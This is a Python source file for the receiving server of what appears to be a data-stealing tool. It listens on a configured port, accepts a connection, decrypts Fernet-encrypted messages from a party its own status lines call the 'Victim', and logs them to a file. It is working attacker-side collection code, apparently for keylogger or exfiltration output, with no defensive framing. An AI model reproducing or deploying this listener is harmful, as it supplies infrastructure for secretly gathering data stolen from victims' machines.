import socket
import yaml
from cryptography.fernet import Fernet
import ast
from colorama import Fore,init

init()
with open("cryptokey.txt", "r", encoding="utf-8") as f:
    key_bytes = ast.literal_eval(f.read())
    cipher = Fernet(key_bytes)

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)

    PORT = config["general"]["port"]
    BUFF_SIZE = config["server"]["buff_size"]
    CONN_QUEUE = config["server"]["connection_queue"]

socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_s.bind(("0.0.0.0", PORT))
socket_s.listen(CONN_QUEUE)
print("[*] Waiting for connection")

conn, addr = socket_s.accept()
print(Fore.GREEN + f"[+] {addr} Has connected" + Fore.RESET)

with open("log.txt", "a", encoding="utf-8") as f:
    while True:
        try:
            data = conn.recv(BUFF_SIZE)
            if not data:
                print(Fore.RED + "Victim disconnected" + Fore.RESET)
                break
            decrypted = cipher.decrypt(data)
            print(decrypted.decode())
            f.write(f"{decrypted.decode()}\n")
            f.flush()
        except ConnectionError:
            print(Fore.RED + "Victim disconnected" + Fore.RESET)
            break
        except Exception as e:
            print(Fore.RED + f"An unknown error has occured: {e}" + Fore.RESET)
            break

socket_s.close()
conn.close()